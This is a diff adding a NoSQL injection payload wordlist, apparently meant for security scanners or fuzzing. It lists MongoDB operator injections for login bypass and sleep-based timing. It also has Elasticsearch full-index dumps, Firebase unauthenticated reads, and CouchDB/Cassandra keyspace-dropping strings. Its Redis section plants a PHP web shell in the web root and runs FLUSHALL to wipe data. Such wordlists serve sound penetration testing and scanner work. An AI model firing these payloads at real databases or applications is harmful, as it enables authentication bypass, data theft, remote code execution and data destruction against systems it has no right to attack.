@@ -1,0 +1,80 @@
+# category: nosqli
+# description: NoSQL operator-based injection — Mongo $ne/$gt/$regex, body JSON, keyed arrays.
+# references: OWASP NoSQL Injection, HackTricks NoSQL.
+
+{"$ne": null}
+{"$ne": ""}
+{"$ne": 0}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": "~"}
+{"$regex": ".*"}
+{"$regex": "^a"}
+{"$regex": "admin"}
+{"$exists": true}
+{"$in": [1,2,3,"","admin"]}
+{"$nin": [""]}
+{"$where": "1==1"}
+{"$where": "sleep(5000)"}
+{"$where": "this.password == this.password"}
+{"$where": "function() { return true; }"}
+{"$or": [{"a": 1}, {"a": {"$ne": 1}}]}
+{"$and": [{"a": {"$exists": true}}, {"b": {"$exists": true}}]}
+{"$expr": {"$eq": [1, 1]}}
+{"$text": {"$search": "a"}}
+{"username[$ne]": "admin", "password[$ne]": "a"}
+username[$ne]=admin&password[$ne]=a
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+username[$ne]=&password[$ne]=
+username=admin&password[$ne]=notarealpass
+;return(true)
+';return(true);var dummy='
+'||this.password=='
+' || 1==1 //
+' || 1==1 %00
+' || '1'=='1
+"$ne": null
+"$gt": ""
+{"$comment":"x"}
+{"$in":["admin"]}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$regex": ""}}
+db.users.find({username: {$ne: null}})
+0; sleep(5000)
+';sleep(5000);var x='
+{"$jsonSchema": {}}
+
+# ── Elasticsearch query DSL ──────────────────────────────────────────────
+{"query":{"match_all":{}}}
+{"query":{"query_string":{"query":"* OR 1=1"}}}
+{"query":{"script_score":{"script":{"source":"1"}}}}
+{"query":{"script":{"script":{"source":"doc['x'].value"}}}}
+{"size":10000,"query":{"match_all":{}}}
+{"aggs":{"all":{"terms":{"field":"_id","size":1000}}}}
+
+# ── Redis — unauthenticated / unquoted commands ──────────────────────────
+INFO
+CONFIG GET *
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET x "<?php system($_GET['c']);?>"
+SAVE
+FLUSHALL
+SLAVEOF 127.0.0.1 6379
+EVAL "return 1" 0
+
+# ── CouchDB / Cassandra ──────────────────────────────────────────────────
+_all_docs
+/_users/_all_docs
+/_config
+;DROP KEYSPACE x;
+' AND token(id)>token(now())--
+;SELECT * FROM system.local;
+
+# ── Firebase REST ────────────────────────────────────────────────────────
+/users.json?auth=null
+/users.json?orderBy=%22role%22&equalTo=%22admin%22
+/.json
+/.json?print=pretty
